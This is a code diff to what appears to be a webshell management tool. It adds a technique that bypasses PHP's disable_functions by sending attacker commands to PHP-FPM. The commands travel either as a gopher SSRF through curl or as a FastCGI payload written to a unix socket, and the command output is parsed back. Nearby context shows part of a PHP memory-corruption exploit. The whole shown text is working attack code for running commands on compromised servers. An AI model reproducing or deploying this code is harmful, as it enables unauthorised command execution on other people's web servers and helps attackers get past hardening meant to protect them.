@@ -24,6 +24,7 @@ from urllib3 import disable_warnings
 
 from libs.config import color, gget, gset
 from libs.runtime_config import CONFIG
+from auxiliary.fpm.fpm import generate_ssrf_payload, generate_base64_socks_payload
 
 LEVEL = []
 CONNECT_PIPE_MAP = {True: "│  ", False: "   "}
@@ -1563,6 +1564,30 @@ $dlls[NB_DANGLING]->rewind();
  
 # Trigger the bug on the first list
 $dlls[0]->offsetUnset(0);""" % (print_command, base64_encode(command))
+    elif (bypass_df == 10):
+        code = '<?php $o=array();exec(base64_decode("%s"), $o);$o=join(chr(10),$o);%s?>' % (
+            base64_encode(command), print_command)
+        attack_type = gget("webshell.bdf_fpm.type", "webshell")
+        host = gget("webshell.bdf_fpm.host", "webshell")
+        port = gget("webshell.bdf_fpm.port", "webshell")
+        php_file = gget("webshell.bdf_fpm.php_file", "webshell")
+        if attack_type == "gopher":
+            phpcode = """function curl($url){
+                $ch = curl_init();
+                curl_setopt($ch, CURLOPT_URL, $url);
+                curl_setopt($ch, CURLOPT_HEADER, 0);
+                curl_exec($ch);
+                curl_close($ch);
+}
+ob_start();curl("%s");$fpm_r=ob_get_clean();$fpm_r=explode(urldecode('%%0a'),$fpm_r);$fpm_r=array_slice($fpm_r,3);$fpm_r=implode("\\n",$fpm_r);$fpm_r=explode(urldecode('%%00'),$fpm_r);$fpm_r=array_slice($fpm_r,0,1);print(current($fpm_r));
+""" % generate_ssrf_payload(host, port, php_file, code)
+        else:
+            sock_path = gget("webshell.bdf_fpm.sock_path", "webshell")
+            phpcode = """$sock=stream_socket_client('unix://%s');
+fputs($sock, base64_decode("%s"));while(!feof($sock)){$fpm_r.=fread($sock,4096);}
+$fpm_r=explode(urldecode('%%0a'),$fpm_r);$fpm_r=array_slice($fpm_r,3);$fpm_r=implode("\\n",$fpm_r);$fpm_r=explode(urldecode('%%00'),$fpm_r);$fpm_r=array_slice($fpm_r,0,1);print(current($fpm_r));""" % (sock_path, generate_base64_socks_payload(host, port, php_file, code))
+            return phpcode
+
     elif (gget("webshell.exec_func", "webshell") and SYSTEM_TEMPLATE):
         return SYSTEM_TEMPLATE % (base64_encode(command)) + print_command
     else:
